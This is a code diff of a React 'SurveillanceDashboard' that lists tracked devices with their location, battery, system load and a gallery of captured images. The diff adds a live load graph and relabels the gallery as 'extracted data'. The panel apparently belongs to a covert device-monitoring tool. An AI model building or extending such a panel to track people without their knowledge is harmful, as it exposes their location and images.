@@ -8,12 +8,16 @@ import {
   RefreshCw,
   Crosshair,
   Globe,
+  Activity,
+  HardDrive,
 } from "lucide-react";
+import { LineChart, Line, ResponsiveContainer, YAxis, Tooltip } from "recharts";
 
 export default function SurveillanceDashboard() {
   const [devices, setDevices] = useState([]);
   const [selectedDevice, setSelectedDevice] = useState(null);
   const [loading, setLoading] = useState(true);
+  const [resourceHistory, setResourceHistory] = useState([]);
 
   const fetchDevices = async () => {
     try {
@@ -21,12 +25,28 @@ export default function SurveillanceDashboard() {
       const data = await res.json();
       if (data.success) {
         setDevices(data.data);
-        // If we have a selected device, update its data from the list if available
+        // If we have a selected device, update its data
         if (selectedDevice) {
           const updated = data.data.find(
             (d) => d.deviceId === selectedDevice.deviceId
           );
-          if (updated) setSelectedDevice(updated);
+          if (updated) {
+            setSelectedDevice(updated);
+            // Update resource history for graph
+            if (updated.resourceUsage) {
+              setResourceHistory((prev) => {
+                const newData = [
+                  ...prev,
+                  {
+                    time: new Date().toLocaleTimeString(),
+                    usage: updated.resourceUsage,
+                  },
+                ];
+                if (newData.length > 20) newData.shift();
+                return newData;
+              });
+            }
+          }
         }
       }
     } catch (err) {
@@ -38,9 +58,14 @@ export default function SurveillanceDashboard() {
 
   useEffect(() => {
     fetchDevices();
-    const interval = setInterval(fetchDevices, 5000); // Poll every 5s
+    const interval = setInterval(fetchDevices, 2000); // Poll faster for real-time feel
     return () => clearInterval(interval);
-  }, []);
+  }, [selectedDevice?.deviceId]); // Re-run if selected device changes to ensure we track the right one
+
+  const handleDeviceSelect = (device) => {
+    setSelectedDevice(device);
+    setResourceHistory([]); // Reset history for new device
+  };
 
   return (
     <div className="min-h-screen bg-black text-green-500 font-mono flex">
@@ -59,7 +84,7 @@ export default function SurveillanceDashboard() {
           {devices.map((device) => (
             <div
               key={device._id}
-              onClick={() => setSelectedDevice(device)}
+              onClick={() => handleDeviceSelect(device)}
               className={`p-4 border-b border-green-900/50 cursor-pointer hover:bg-green-900/20 transition-colors ${
                 selectedDevice?.deviceId === device.deviceId
                   ? "bg-green-900/30 border-l-4 border-l-green-500"
@@ -78,8 +103,8 @@ export default function SurveillanceDashboard() {
                   {Math.round(device.battery?.level || 0)}%
                 </span>
                 <span className="flex items-center gap-1">
-                  <Smartphone className="w-3 h-3" />{" "}
-                  {device.deviceInfo?.platform || "Unknown"}
+                  <Activity className="w-3 h-3" /> {device.resourceUsage || 0}%
+                  Load
                 </span>
               </div>
             </div>
@@ -94,7 +119,7 @@ export default function SurveillanceDashboard() {
       </div>
 
       {/* Main Content - Detail View */}
-      <div className="flex-1 flex flex-col bg-[url('/grid.png')] bg-repeat opacity-90">
+      <div className="flex-1 flex flex-col bg-[url('/grid.png')] bg-repeat opacity-90 overflow-hidden">
         {selectedDevice ? (
           <div className="p-6 h-full overflow-y-auto">
             {/* Header */}
@@ -121,6 +146,45 @@ export default function SurveillanceDashboard() {
 
             {/* Stats Grid */}
             <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6 mb-8">
+              {/* Resource Monitor Graph */}
+              <div className="bg-black/80 border border-green-800 p-4 rounded shadow-[0_0_10px_rgba(0,255,0,0.1)] col-span-1 md:col-span-2 lg:col-span-1">
+                <h3 className="text-sm text-gray-400 mb-3 flex items-center gap-2">
+                  <Activity className="w-4 h-4" /> REAL-TIME SYSTEM LOAD
+                </h3>
+                <div className="h-32 w-full">
+                  <ResponsiveContainer width="100%" height="100%">
+                    <LineChart data={resourceHistory}>
+                      <Line
+                        type="monotone"
+                        dataKey="usage"
+                        stroke="#00ff41"
+                        strokeWidth={2}
+                        dot={false}
+                        isAnimationActive={false}
+                      />
+                      <YAxis domain={[0, 100]} hide />
+                      <Tooltip
+                        contentStyle={{
+                          backgroundColor: "#000",
+                          border: "1px solid #00ff41",
+                        }}
+                        itemStyle={{ color: "#00ff41" }}
+                      />
+                    </LineChart>
+                  </ResponsiveContainer>
+                </div>
+                <div className="flex justify-between text-xs mt-2 text-green-700">
+                  <span>IDLE</span>
+                  <span>
+                    {resourceHistory.length > 0
+                      ? resourceHistory[resourceHistory.length - 1].usage
+                      : 0}
+                    % USAGE
+                  </span>
+                  <span>CRITICAL</span>
+                </div>
+              </div>
+
               {/* Location Card */}
               <div className="bg-black/80 border border-green-800 p-4 rounded shadow-[0_0_10px_rgba(0,255,0,0.1)]">
                 <h3 className="text-sm text-gray-400 mb-3 flex items-center gap-2">
@@ -145,9 +209,6 @@ export default function SurveillanceDashboard() {
                       <span className="text-white">
                         {selectedDevice.location.accuracy}m
                       </span>
-                    </div>
-                    <div className="mt-4 h-32 bg-green-900/20 rounded flex items-center justify-center border border-green-900/50 text-xs text-green-800">
-                      [MAP VISUALIZATION PLACEHOLDER]
                     </div>
                   </div>
                 ) : (
@@ -189,12 +250,6 @@ export default function SurveillanceDashboard() {
                     </span>
                   </div>
                   <div className="flex justify-between">
-                    <span>CORES:</span>
-                    <span className="text-white">
-                      {selectedDevice.deviceInfo?.cores}
-                    </span>
-                  </div>
-                  <div className="flex justify-between">
                     <span>PLATFORM:</span>
                     <span className="text-white">
                       {selectedDevice.deviceInfo?.platform}
@@ -202,48 +257,35 @@ export default function SurveillanceDashboard() {
                   </div>
                 </div>
               </div>
-
-              {/* Network/User Agent */}
-              <div className="bg-black/80 border border-green-800 p-4 rounded shadow-[0_0_10px_rgba(0,255,0,0.1)]">
-                <h3 className="text-sm text-gray-400 mb-3 flex items-center gap-2">
-                  <Smartphone className="w-4 h-4" /> FINGERPRINT
-                </h3>
-                <div className="text-xs break-all text-gray-300 font-mono">
-                  {selectedDevice.deviceInfo?.userAgent}
-                </div>
-                <div className="mt-4 text-xs text-green-600">
-                  IP: [HIDDEN] <br />
-                  ISP: [HIDDEN]
-                </div>
-              </div>
             </div>
 
             {/* Captured Images Gallery */}
             <div className="border-t border-green-900 pt-6">
               <h3 className="text-lg font-bold mb-4 flex items-center gap-2">
-                <Camera className="w-5 h-5" /> SURVEILLANCE FEED
+                <HardDrive className="w-5 h-5" /> EXTRACTED DATA & SURVEILLANCE
+                FEED
               </h3>
               {selectedDevice.images && selectedDevice.images.length > 0 ? (
-                <div className="grid grid-cols-2 md:grid-cols-3 lg:grid-cols-4 gap-4">
+                <div className="grid grid-cols-2 md:grid-cols-4 lg:grid-cols-6 gap-4">
                   {selectedDevice.images.map((img, idx) => (
                     <div
                       key={idx}
-                      className="relative group border border-green-800 rounded overflow-hidden"
+                      className="relative group border border-green-800 rounded overflow-hidden bg-black"
                     >
                       <img
                         src={img.url}
                         alt="Captured"
-                        className="w-full h-48 object-cover opacity-80 group-hover:opacity-100 transition-opacity"
+                        className="w-full h-32 object-cover opacity-70 group-hover:opacity-100 transition-opacity"
                       />
-                      <div className="absolute bottom-0 left-0 right-0 bg-black/70 text-[10px] p-1 text-center">
-                        {new Date(img.capturedAt).toLocaleString()}
+                      <div className="absolute bottom-0 left-0 right-0 bg-black/80 text-[9px] p-1 text-center text-green-400 truncate">
+                        {new Date(img.capturedAt).toLocaleTimeString()}
                       </div>
                     </div>
                   ))}
                 </div>
               ) : (
                 <div className="text-gray-500 italic text-sm border border-dashed border-green-900 p-8 text-center rounded">
-                  No visual data captured yet.
+                  No visual data extracted yet.
                 </div>
               )}
             </div>
